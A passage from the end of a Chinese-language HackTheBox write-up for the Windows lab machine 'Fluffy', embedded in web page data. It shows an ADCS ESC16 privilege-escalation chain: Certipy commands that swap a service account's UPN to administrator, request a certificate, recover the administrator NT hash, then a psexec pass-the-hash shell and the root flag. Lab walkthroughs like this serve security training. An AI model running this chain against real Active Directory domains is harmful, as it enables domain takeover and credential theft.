class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n[*] NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e: ca0f4f9e9eb8a092addf53bb03fc98c8\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e下面跟着利用链接的做即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ certipy account -u \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':ca0f4f9e9eb8a092addf53bb03fc98c8'\u003c/span\u003e -dc-ip 10.10.11.69 -user \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e\n\n[*] Reading attributes \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e:\n    cn                                  : certificate authority service\n    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb\n    name                                : certificate authority service\n    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103\n    sAMAccountName                      : ca_svc\n    servicePrincipalName                : ADCS/ca.fluffy.htb\n    userPrincipalName                   : ca_svc@fluffy.htb\n    userAccountControl                  : 66048\n    whenCreated                         : 2025-04-17T16:07:50+00:00\n    whenChanged                         : 2025-05-25T14:57:02+00:00\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ ntpdate -s 10.10.11.69 \u0026#x26;\u0026#x26; certipy-ad account -u \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':ca0f4f9e9eb8a092addf53bb03fc98c8'\u003c/span\u003e -dc-ip 10.10.11.69 -upn \u003cspan class=\"hljs-string\"\u003e'administrator@fluffy.htb'\u003c/span\u003e -user \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e update\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e:\n    userPrincipalName                   : administrator@fluffy.htb\n[*] Successfully updated \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ certipy req -u \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':ca0f4f9e9eb8a092addf53bb03fc98c8'\u003c/span\u003e -dc-ip 10.10.11.69 -target \u003cspan class=\"hljs-string\"\u003e'DC01.fluffy.htb'\u003c/span\u003e -ca \u003cspan class=\"hljs-string\"\u003e'fluffy-DC01-CA'\u003c/span\u003e -template \u003cspan class=\"hljs-string\"\u003e'User'\u003c/span\u003e\n\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 43\n[*] Successfully requested certificate\n[*] Got certificate with UPN \u003cspan class=\"hljs-string\"\u003e'administrator@fluffy.htb'\u003c/span\u003e\n[*] Certificate has no object SID\n[*] Try using -sid to \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e the object SID or see the wiki \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more details\n[*] Saving certificate and private key to \u003cspan class=\"hljs-string\"\u003e'administrator.pfx'\u003c/span\u003e\n[*] Wrote certificate and private key to \u003cspan class=\"hljs-string\"\u003e'administrator.pfx'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ ntpdate -s 10.10.11.69 \u0026#x26;\u0026#x26; certipy-ad account -u \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':ca0f4f9e9eb8a092addf53bb03fc98c8'\u003c/span\u003e -dc-ip 10.10.11.69 -upn \u003cspan class=\"hljs-string\"\u003e'ca_svc@fluffy.htb'\u003c/span\u003e -user \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e update\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e:\n    userPrincipalName                   : ca_svc@fluffy.htb\n[*] Successfully updated \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ certipy auth -pfx administrator.pfx -username \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e -domain \u003cspan class=\"hljs-string\"\u003e'fluffy.htb'\u003c/span\u003e -dc-ip 10.10.11.69                                                                                                   \nCertipy v5.0.2 - by Oliver Lyak (ly4k)      \n                                                                                                                                                                                                                  \n[*] Certificate identities:                                                                                                                                                                                       \n[*]     SAN UPN: \u003cspan class=\"hljs-string\"\u003e'administrator@fluffy.htb'\u003c/span\u003e                                                              \n[*] Using principal: \u003cspan class=\"hljs-string\"\u003e'administrator@fluffy.htb'\u003c/span\u003e                                                                                                                                                                   \n[*] Trying to get TGT...                                                                                                                                                                                          \n[*] Got TGT\n[*] Saving credential cache to \u003cspan class=\"hljs-string\"\u003e'administrator.ccache'\u003c/span\u003e\n[*] Wrote credential cache to \u003cspan class=\"hljs-string\"\u003e'administrator.ccache'\u003c/span\u003e \n[*] Trying to retrieve NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e\n[*] Got \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'administrator@fluffy.htb'\u003c/span\u003e: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ psexec.py fluffy.htb/administrator@10.10.11.69 -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.11.69.....\n[*] Found writable share ADMIN$\n[*] Uploading file VJlmOeTb.exe\n[*] Opening SVCManager on 10.10.11.69.....\n[*] Creating service trya on 10.10.11.69.....\n[*] Starting service trya.....\n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nMicrosoft Windows [Version 10.0.17763.6893]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32\u003e \n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\Administrator\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n03337de6b0f0f5188a76c3970006b97b\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003eCVE-2025-24071，ADCS，ESC16，NTLM 中继\u003c/p\u003e","title":"HackTheBox - Season8 - Fluffy","date":"2025-05-25","updated":"2025-05-25","tags":["HackTheBox","Windows","ADCS","ESC16","responder","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Fluffy\n\n https://app.hackthebox.com/machines/Fluffy | `Windows` · `Easy`\n \n\nMachine Information：As is common in real life Windows pentests, you will start the Fluffy box with credentials for...","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason8 - Fluffy"},"buildId":"1CjfWk4j6sgto1bTaygaz","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>